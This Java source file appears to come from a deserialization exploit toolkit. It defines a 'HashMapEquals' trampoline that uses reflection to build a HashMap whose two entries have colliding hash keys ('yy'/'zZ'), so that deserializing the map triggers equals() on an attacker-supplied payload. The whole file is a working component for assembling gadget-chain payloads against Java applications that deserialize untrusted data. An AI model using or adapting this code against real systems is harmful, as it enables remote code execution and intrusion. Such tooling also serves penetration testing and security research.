package org.ses.gadgetbuilder.impl.trampolines.equals;

import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.chains.trampolines.singleparam.EqualsTrampoline;
import org.ses.gadgetbuilder.util.Reflections;

import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

@Authors({ Authors.MBECHLER, Authors.BofeiC })
public class HashMapEquals implements EqualsTrampoline {
    @Override
    public Object wrapPayload(Object payload, Object param) throws Exception {

        Object hashMap = new HashMap<>();

        HashMap map1 = new HashMap();
        HashMap map2 = new HashMap();
        map1.put("yy",param);
        map1.put("zZ",payload);
        map2.put("yy",payload);
        map2.put("zZ",param);

        Object node1 = Reflections.createWithoutConstructor(Class.forName("java.util.HashMap$Node"));
        Reflections.setFieldValue(node1, "key", map1);
        Reflections.setFieldValue(node1, "value", "1");

        Object node2 = Reflections.createWithoutConstructor(Class.forName("java.util.HashMap$Node"));
        Reflections.setFieldValue(node2, "key", map2);
        Reflections.setFieldValue(node2, "value", "1");

        Object hashMapTbl = Array.newInstance(Class.forName("java.util.HashMap$Node"), 2);
        Array.set(hashMapTbl, 0, node1);
        Array.set(hashMapTbl, 1, node2);

        Reflections.setFieldValue(hashMap, "table", hashMapTbl);
        Reflections.setFieldValue(hashMap, "size", 2);

        return hashMap;
    }
}
